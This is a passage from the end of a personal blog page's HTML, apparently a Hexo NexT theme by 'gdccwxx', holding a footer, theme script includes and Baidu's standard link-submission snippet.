          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">gdccwxx</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  
  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>


</body>
</html>
